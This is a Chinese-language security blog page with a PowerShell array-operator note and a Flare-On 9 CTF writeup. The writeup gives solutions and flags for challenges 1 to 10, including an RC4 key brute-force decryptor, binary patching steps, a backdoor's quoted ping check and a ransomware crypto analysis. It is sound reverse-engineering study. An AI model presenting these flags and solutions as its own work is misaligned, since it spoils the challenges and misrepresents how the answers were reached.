<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>歐欸利恩的部落格</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="歐欸利恩的部落格"><meta name="msapplication-TileImage" content="/images/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="歐欸利恩的部落格"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="歐欸利恩的部落格"><meta property="og:url" content="http://oalieno.github.io/"><meta property="og:site_name" content="歐欸利恩的部落格"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://oalieno.github.io/img/og_image.png"><meta property="article:author" content="oalieno"><meta property="article:tag" content="blog, security, programming, coding, life"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://oalieno.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://oalieno.github.io"},"headline":"歐欸利恩的部落格","image":["http://oalieno.github.io/img/og_image.png"],"author":{"@type":"Person","name":"oalieno"},"publisher":{"@type":"Organization","name":"歐欸利恩的部落格","logo":{"@type":"ImageObject","url":{"text":"歐欸利恩的部落格","img":"/images/logo.svg"}}},"description":""}</script><link rel="icon" href="/images/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&amp;family=Material+Icons&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-LYLB67MBLS" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'G-LYLB67MBLS');</script><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img nolazy src="/images/logo.svg" alt="歐欸利恩的部落格" height="28"><p>歐欸利恩的部落格</p></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">首頁</a><a class="navbar-item" href="/archives">文章</a><a class="navbar-item" href="/categories">分類</a><a class="navbar-item" href="/tags">標籤</a><a class="navbar-item" href="/about">關於我</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2022-12-14T16:00:00.000Z" title="12/15/2022, 12:00:00 AM">2022-12-15</time></span><i class="material-icons">schedule</i><span class="level-item">4 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/12/15/powershell-00/">【Powershell】WTF Powershell</a></h1><div class="content"><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>..<span class="number">4</span>+,<span class="number">2</span></span><br><span class="line"><span class="number">3</span>..<span class="number">4</span>+<span class="number">2</span></span><br><span class="line"><span class="number">2</span>+<span class="number">3</span>..<span class="number">4</span></span><br><span class="line">,<span class="number">2</span>+<span class="number">3</span>..<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>以上四句表達式，哪一個是不合法的表達式呢?</p>
<p>…<br>
<br><br>
<br><br>
<br></p>
<p>答案是第三句 <code>2+3..4</code>，他會噴出以下的 error</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">方法引動過程失敗，因為 [<span class="type">System.Object</span>[]] 未包含名為 <span class="string">&#x27;op_Addition&#x27;</span> 的方法。</span><br><span class="line">位於 線路:<span class="number">1</span> 字元:<span class="number">1</span></span><br><span class="line">+ <span class="number">2</span>+<span class="number">3</span>..<span class="number">4</span></span><br><span class="line">+ ~~~~~~</span><br><span class="line">    + CategoryInfo          : InvalidOperation: (op_Addition:String) []，RuntimeException</span><br><span class="line">    + FullyQualifiedErrorId : MethodNotFound</span><br></pre></td></tr></table></figure>
<h2 id="一些背景知識">一些背景知識</h2>
<p>在詳細講解為什麼 <code>2+3..4</code> 會出錯之前，我們首先要理解 powershell 中的四個概念，都很好理解(有學過其他語言的話O_O)，分別是</p>
<ul>
<li>create array</li>
<li>nested array</li>
<li>append array</li>
<li>range</li>
</ul>
<h3 id="create-array">create array</h3>
<p>要 create 一個 array 很簡單，只要用 <code>,</code> 逗號把數字隔開，像是 <code>1,2,3</code> 這樣，就是一個 array 了，不一定要有括號在外面</p>
<h3 id="nested-array">nested array</h3>
<p>兩個逗號的話，像這樣 <code>,,1</code> 就是一個兩層的 nested array，等同於 python 的 <code>[[1]]</code></p>
<h3 id="append-array">append array</h3>
<p>在 powershell 中，串接陣列是用 <code>+</code>，要 <code>,2</code> 陣列和 <code>,3</code> 陣列串接的話就是 <code>,2+,3</code>，等同於 python 的 <code>[2] + [3]</code></p>
<h3 id="range">range</h3>
<p>和其他的一些語言(bash, rust, …)一樣，powershell 是採用 <code>..</code> 來作為 range operator，像是 <code>1..5</code> 就等於 <code>1,2,3,4,5</code></p>
<h2 id="WTF-Powershell">WTF Powershell</h2>
<p>在複習了一些 powershell 的背景知識後，我們就來看看為什麼 <code>2+3..4</code> 會是不合法的表達式，明明對稱的另一個表達式 <code>3..4+2</code> 是合法的阿<br>
首先就運算元的優先序來看，是 <code>,</code> &gt; <code>..</code> &gt; <code>+</code> 的，所以我們可以把上面的四個表達式寫成</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">3</span>..<span class="number">4</span>)+(,<span class="number">2</span>)</span><br><span class="line">(<span class="number">3</span>..<span class="number">4</span>)+<span class="number">2</span></span><br><span class="line"><span class="number">2</span>+(<span class="number">3</span>..<span class="number">4</span>)</span><br><span class="line">(,<span class="number">2</span>)+(<span class="number">3</span>..<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>實際上這四句分別是</p>
<ul>
<li><code>Object[] + Object[]</code></li>
<li><code>Object[] + Int32</code></li>
<li><code>Int32 + Object[]</code></li>
<li><code>Object[] + Object[]</code></li>
</ul>
<p>回頭看一下 error message 你就會發現它其實就是在說不能把 <code>Int32 + Object[]</code><br>
但是 <code>Object[] + Int32</code> 卻可以，所以他只實作了一個方向的加法? WTF Powershell?<br>
不過換個方向，用 python 的角度來看，他其實像是 <code>a = [3, 4]; a.append(2)</code> 是可以的，但是沒有 <code>a = 2; a.append([3, 4])</code> 這種寫法</p>
<p>總而言之，因為 Powershell 把 <code>Object[]</code> 和 <code>Object[]</code> 的 concat 和 <code>Object[]</code> 和 <code>Int32</code> 的 append 混著用都是用 <code>+</code> 一個 operator 搞定，所以第一次看的時候會有些頭昏眼花，但其實還勉強算合理，不像隔壁棚的 javascript 群魔亂舞的。Powershell 的部分之後應該還會有更新，大家下集再見。</p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2022/12/15/powershell-00/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2022-11-11T16:00:00.000Z" title="11/12/2022, 12:00:00 AM">2022-11-12</time></span><i class="material-icons">schedule</i><span class="level-item">19 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/11/12/flare-on-9/zh-tw/">【Writeups】Flare-on 9</a></h1><div class="content"><p align="center"><img data-src="/images/flare-on-9.png" class=" lazyload"  title="flare-on 9 completed!!!"></p>
<h2 id="01-Flaredle">01 - Flaredle</h2>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">CORRECT_GUESS</span> = <span class="number">57</span>;</span><br><span class="line"><span class="keyword">let</span> rightGuessString = <span class="variable constant_">WORDS</span>[<span class="variable constant_">CORRECT_GUESS</span>];</span><br><span class="line"><span class="keyword">if</span> (guessString === rightGuessString) &#123;</span><br><span class="line">    <span class="keyword">let</span> flag = rightGuessString + <span class="string">&#x27;@flare-on.com&#x27;</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag 就是 <code>WORDS[57]</code></p>
<h2 id="02-Pixel-Poker">02 - Pixel Poker</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (x == <span class="number">0x52414c46</span> % <span class="number">741</span> &amp;&amp; y == <span class="number">0x6e4f2d45</span> % <span class="number">641</span>) &#123;</span><br><span class="line">    <span class="meta"># print flag</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>點選 <code>(95, 313)</code> 這個格子就會噴出 flag 如下</p>
<p align="center"><img data-src="/images/02-flag.png" class=" lazyload"  width="500" title="flare-on challenge 02 flag"></p>
<h2 id="03-Magic-8-Ball">03 - Magic 8 Ball</h2>
<p>按 <code>LLURULDUL</code> 方向鍵<br>
然後在下面輸入 <code>gimme flag pls?</code> 就會噴出 flag 如下</p>
<p align="center"><img data-src="/images/03-flag.png" class=" lazyload"  width="500" title="flare-on challenge 03 flag"></p>
<h2 id="04-darn-mice">04 - darn_mice</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    *ptr = payload[i] + input[i];</span><br><span class="line">    (<span class="type">void</span>(*)())(ptr)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每個 byte 都會被當成 1-byte shellcode 呼叫，只有全部都是 <code>0xc3</code> 也就是 ret 才不會 crash</p>
<p>flag 是 <code>i_w0uld_l1k3_to_RETurn_this_joke@flare-on.com</code></p>
<h2 id="05-T8">05 - T8</h2>
<p>這題給了一隻 PE 執行檔和一包 pcap</p>
<p>程式一開始會有個 anti-debug，判斷時間是滿月的時候才能執行<br>
他有一個函式是在計算月亮的週期 OwO</p>
<p>pcap 裡面有兩個 requests 兩個 response<br>
總之動態追一下可以發現他計算 request 內容的邏輯<br>
基本上他就是用 RC4 加密，他產的 key 是 <code>FO9</code> 加上 0 到 65535 之間隨機一個數字，比如 <code>FO91234</code>，做 md5 的結果<br>
所以爆搜一下就可以解出封包的內容，爆搜程式碼如下，要注意 wide string 的轉換 O_O</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_wide</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join([<span class="built_in">bytes</span>([i, <span class="number">0</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> x])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_wide</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(x):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">and</span> j != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> to_wide(hashlib.md5(to_wide(x)).hexdigest().encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, m</span>):</span><br><span class="line">    <span class="keyword">return</span> ARC4.new(key).encrypt(m)</span><br><span class="line"></span><br><span class="line">enc_req = b64decode(<span class="string">&quot;ydN8BXq16RE=&quot;</span>)</span><br><span class="line">enc_res = b64decode(<span class="string">&quot;TdQdBRa1nxGU06dbB27E7SQ7TJ2+cd7zstLXRQcLbmh2nTvDm1p5IfT/Cu0JxShk6tHQBRWwPlo9zA1dISfslkLgGDs41WK12ibWIflqLE4Yq3OYIEnLNjwVHrjL2U4Lu3ms+HQc4nfMWXPgcOHb4fhokk93/AJd5GTuC5z+4YsmgRh1Z90yinLBKB+fmGUyagT6gon/KHmJdvAOQ8nAnl8K/0XG+8zYQbZRwgY6tHvvpfyn9OXCyuct5/cOi8KWgALvVHQWafrp8qB/JtT+t5zmnezQlp3zPL4sj2CJfcUTK5copbZCyHexVD4jJN+LezJEtrDXP1DJNg==&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span> * <span class="number">256</span>):</span><br><span class="line">    key = gen_key(<span class="string">b&#x27;FO9&#x27;</span> + <span class="built_in">str</span>(i).encode())</span><br><span class="line">    dec_req = rc4(key, enc_req)</span><br><span class="line">    <span class="keyword">if</span> check_wide(dec_req):</span><br><span class="line">        dec_res = rc4(key, enc_res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dec_req)</span><br><span class="line"><span class="built_in">print</span>(dec_res)</span><br></pre></td></tr></table></figure>
<p>然後解出第一個封包的內容之後，裡面的內容是用 <code>,</code> 分開的如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">\xe5\x07\t\x00\x03\x00\x0f\x00\r\x00%\x00\x03\x00b\x02</span><br><span class="line">\x00\xdc\x07\n\x00\x06\x00\r\x00\r\x00%\x00\t\x00*\x03</span><br><span class="line">\x00\xe1\x07\x0c\x00\x04\x00\x07\x00\r\x00%\x00$\x00\xe5\x00</span><br><span class="line">\x00\xe0\x07\x05\x00\x05\x00\x06\x00\r\x00%\x00\x0b\x00&amp;\x00</span><br><span class="line">\x00\xe2\x07\n\x00\x01\x00\x08\x00\r\x00%\x00\x1f\x00E\x03</span><br><span class="line">\x00\xe6\x07\x03\x00\x02\x00\x01\x00\r\x00%\x002\x00\xda\x00</span><br><span class="line">\x00\xde\x07\x07\x00\x02\x00\x16\x00\r\x00%\x006\x00\xd1\x02</span><br><span class="line">\x00\xde\x07\x05\x00\x03\x00\x0e\x00\r\x00%\x00\x01\x00\xe8\x00</span><br><span class="line">\x00\xda\x07\x04\x00\x01\x00\x05\x00\r\x00%\x00:\x00\x0b\x00</span><br><span class="line">\x00\xdd\x07\n\x00\x04\x00\x03\x00\r\x00%\x00\x16\x00\x16\x03</span><br><span class="line">\x00\xde\x07\x01\x00\x02\x00\x0e\x00\r\x00%\x00\x10\x00\xc9\x00</span><br><span class="line">\x00\xdc\x07\x0c\x00\x01\x00\n\x00\r\x00%\x000\x00\x0c\x02</span><br><span class="line">\x00\xe6\x07\x02\x00\x01\x00\x1c\x00\r\x00%\x00&quot;\x00K\x01</span><br><span class="line">\x00\xe6\x07\t\x00\x05\x00\t\x00\r\x00%\x00!\x00m\x01</span><br></pre></td></tr></table></figure>
<p>每行都是代表某年某月某日，然後算一下是陰曆幾號，再把那個數字對到 <code>a-z0-9</code> 就可以組出 flag 了，大概吧 O3O?<br>
反正後來我覺得好麻煩，就直接把解出來的封包內容倒回去 debugger，flag 就掉出來了 O_O</p>
<p>flag 是 <code>i_s33_you_m00n@flare-on.com</code></p>
<p><a target="_blank" rel="noopener" href="https://github.com/oalieno/CTF/tree/master/flare-on/9/05">看 code 點我</a></p>
<h2 id="06-a-la-mode">06 - à la mode</h2>
<p>這題乍看之下是 .NET 程式<br>
但用 dnspy 翻了一下發現沒什麼東西<br>
在逛 PEBear 的時候就看到了 .NET Header 裡面的 Flags 寫了 Native EntryPoint</p>
<p align="center"><img data-src="/images/06-pe-bear.png" class=" lazyload"  title="flare-on challenge 06 pe bear result"></p>
<p>咦?難道這是隻普通的 dll<br>
直接抄起我的 IDA Pro 和 x64dbg<br>
咻咻咻，一陣亂跳，看到了一些 pipe 的東西，再多翻一下就翻到某個地方長得很像是在 decode flag 的地方，還有出現 <code>MyV0ic3</code> 字串<br>
難道是要 create pipe 然後傳這個字串，好像很麻煩，我直接手起刀落把 cmp 的另一個變數一樣改成 <code>MyV0ic3</code>，再按了幾下 step over，登登，flag 就出現在 memory 了</p>
<p align="center"><img data-src="/images/06-flag.png" class=" lazyload"  title="flare-on challenge 06 flag"></p>
<p>flag 是 <code>M1x3d_M0dE_4_l1f3@flare-on.com</code></p>
<p>p.s. 解這題的時候剛好要出門吃飯，原本想說只是先看一下題目，沒想到 flag 就自己掉出來了xD</p>
<h2 id="07-anode">07 - anode</h2>
<p>這隻程式是用 node.js 寫的，是用 <a target="_blank" rel="noopener" href="https://github.com/nexe/nexe">nexe</a> 這個東西打包的<br>
用文字編輯器打開看一下就會發現檔案最後面有 js 原始碼</p>
<p>js 原始碼裡面有一大堆的 switch case<br>
主要的邏輯就是把你的輸入 -&gt; 做一連串的 add, sub, xor 的操作 -&gt; 檢查跟某個值是不是一樣的，是的話你的輸入就是 flag</p>
<p>我們可以直接去改最後的 js 原始碼，只要讓整個檔案的大小不變就不會噴 error，他執行的時候應該是直接抓一個固定的 offset?<br>
加了一行 <code>require(&quot;a.js&quot;)</code>，這樣我就可以直接跑我自己的 js<br>
簡單測試了一下，發現 node.js 被改過了，random 的輸出不 random，其他一些運算也被改過<br>
正常來說是要比對一下原版的 node.js 和這個改過的 node.js 差在哪裡<br>
但是我覺得好麻煩，我直接用 visual studio code 的超強 replace 功能把那一大串的 add 換成 sub，sub 換成 add，然後當做字串推到一個陣列<br>
接著把陣列倒過來，拿去 <code>eval</code> 就可以 flag 了 OwO</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 原本</span></span><br><span class="line"><span class="comment">case 1071664271:</span></span><br><span class="line"><span class="comment">        if (Math.random() &lt; 0.5) &#123;</span></span><br><span class="line"><span class="comment">          b[17] += b[0] + b[35] + b[12] + b[42] + b[14] + b[3] + 8;</span></span><br><span class="line"><span class="comment">          b[17] &amp;= 0xFF;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">          b[18] ^= (b[20] + b[23] + b[6] + b[12] + b[4] + b[25] + Math.floor(Math.random() * 256)) &amp; 0xFF;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        state = 175099911;</span></span><br><span class="line"><span class="comment">        continue;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 處理過</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1071664271</span>:</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.5</span>) &#123;</span><br><span class="line">          commands.<span class="title function_">push</span>(<span class="string">`b[17] -= b[0] + b[35] + b[12] + b[42] + b[14] + b[3] + 8`</span>);</span><br><span class="line">          commands.<span class="title function_">push</span>(<span class="string">`b[17] &amp;= 0xFF`</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          commands.<span class="title function_">push</span>(<span class="string">`b[18] ^= (b[20] + b[23] + b[6] + b[12] + b[4] + b[25] + <span class="subst">$&#123;<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">256</span>))&#125;</span> &amp; 0xFF`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        state = <span class="number">175099911</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">106</span>, <span class="number">196</span>, <span class="number">106</span>, <span class="number">178</span>, <span class="number">174</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">91</span>, <span class="number">66</span>, <span class="number">255</span>, <span class="number">86</span>, <span class="number">196</span>, <span class="number">74</span>, <span class="number">139</span>, <span class="number">219</span>, <span class="number">166</span>, <span class="number">106</span>, <span class="number">4</span>, <span class="number">211</span>, <span class="number">68</span>, <span class="number">227</span>, <span class="number">72</span>, <span class="number">156</span>, <span class="number">38</span>, <span class="number">239</span>, <span class="number">153</span>, <span class="number">223</span>, <span class="number">225</span>, <span class="number">73</span>, <span class="number">171</span>, <span class="number">51</span>, <span class="number">4</span>, <span class="number">234</span>, <span class="number">50</span>, <span class="number">207</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">111</span>, <span class="number">180</span>, <span class="number">212</span>, <span class="number">81</span>, <span class="number">189</span>, <span class="number">73</span>, <span class="number">76</span>];</span><br><span class="line">commands.<span class="title function_">reverse</span>().<span class="title function_">forEach</span>(<span class="function"><span class="params">command</span> =&gt;</span> <span class="built_in">eval</span>(command));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b)</span><br></pre></td></tr></table></figure>
<p>flag 是 <code>n0t_ju5t_A_j4vaSCriP7_ch4l1eng3@flare-on.com</code></p>
<p>p.s. 雖然 flag 說 <code>not just a javascript challenge</code>，但是我完全把他當作 javascript 來解了，抱歉了xD</p>
<h2 id="08-backdoor">08 - backdoor</h2>
<p>這題被大家說是全部裡面最難的，我覺得是蠻麻煩的，找不到地方偷吃步，或是其實有但我不知道xD (可以偷偷告訴我 O_O)</p>
<p>這隻是 .NET 的程式，dnspy 打開會看到一堆的 try except<br>
一開始跑下去都會進到 except 裡面<br>
因為他是在 except 裡面去建出一個 <code>DynamicMethod</code>，再把正確的 IL code 塞進去跑<br>
但如果你直接把動態跑的時候看到的那段 IL code 抓下來塞回去檔案裡面，會發現還是錯的<br>
因為他有一段是在做 <code>dynamicILInfo.GetTokenFor</code>，是在把外面世界的 metadata token 換成 dynamicILInfo 世界中的 metadata token，所以不能直接把那個 IL 複製出來，要複製再早一點還沒有換掉的，然後把正確的 metadata token 放上去<br>
這邊我因為沒有找到好方法 (對 .NET 不熟 QQ)，所以是用 dyspy 動態跑，手動複製出 IL code 和 metadata token，然後寫個 python script 去改原本的執行檔，最後可以正常的 decompile 所有函式</p>
<p>接著看到了一些 powershell command <code>$(ping -n 1 10.10.21.201 | findstr /i ttl) -eq $null;</code> 拿去 google 了一下就找到了這篇 <a target="_blank" rel="noopener" href="https://www.malwarebytes.com/blog/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor">APT34 targets Jordan Government using new Saitama backdoor</a><br>
長得一模一樣，這題就是從這隻惡意程式改的</p>
<p>其中在處理不同的 task 的部分有發現一些在做比較字串的程式碼<br>
感覺跟 flag 有關，就仔細看了一下，發現他是要依照某個順序把每一個 task 都跑過一次，就會去印 flag<br>
他印 flag 的地方是從 PE 的 <code>5aeb2b97</code> 這個 section 抓資料出來，然後拿去解，中間還會跟 stacktrace 的字串攪在一起，十分的噁心<br>
後來受不了，沒有可以偷吃步的地方，還是乖乖地寫了一個 dns server 跟程式互動，按照步驟去發 task id，執行完之後就噴出 flag 了</p>
<p align="center"><img data-src="/images/08-flag.png" class=" lazyload"  title="flare-on challenge 08 flag"></p>
<p>flag 是 <code>W3_4re_Kn0wn_f0r_b31ng_Dyn4m1c@flare-on.com</code></p>
<p><a target="_blank" rel="noopener" href="https://github.com/oalieno/CTF/tree/master/flare-on/9/08">看 code 點我</a></p>
<h2 id="09-encryptor">09 - encryptor</h2>
<p>這隻是一個 Ransomware，標準的用 Symmetric Encryption 做加密，再用 Asymmetric Encryption 加密 Symmetric Encryption 的 key<br>
很快就可以看出他有做 chacha20<br>
但是一直找不到他用什麼 Asymmetric Encryption，一直在想是什麼複雜的加密演算法，一開始懷疑是 ECC，後來又再猜 NTRU<br>
我看那個迴圈感覺很像是在做快速冪，在想是哪個演算法會做快速冪，不會是 RSA 吧他寫的那麼複雜，到底是哪個，等等難道真的是 RSA<br>
後來測試一下，發現真的是 RSA，因為他在做大數的運算所以看起來很複雜，那些函式就只是在做加法乘法模運算而已 Orz</p>
<p>反正他就是把檔案做 chacha20 加密，加密用的 key 再用 RSA 做加密<br>
RSA 加密之前先用 <code>e=0x10001</code> 去算出對應的 <code>d</code>，然後加密是直接 <code>m^d % n</code><br>
等於我們直接用 <code>c^e % n</code> 去解密就好</p>
<p>flag 是 <code>R$A_$16n1n6_15_0pp0$17e_0f_3ncryp710n@flare-on.com</code></p>
<h2 id="10-Nur-getraumt">10 - Nur geträumt</h2>
<p>這題是 m68k 的程式，非常古老的東西，要古董 Mac 電腦才跑得起來<br>
不過我們只要照著提示去用 <a target="_blank" rel="noopener" href="https://www.gryphel.com/c/minivmac/">Mini vMac</a> 就可以跑起來了<br>
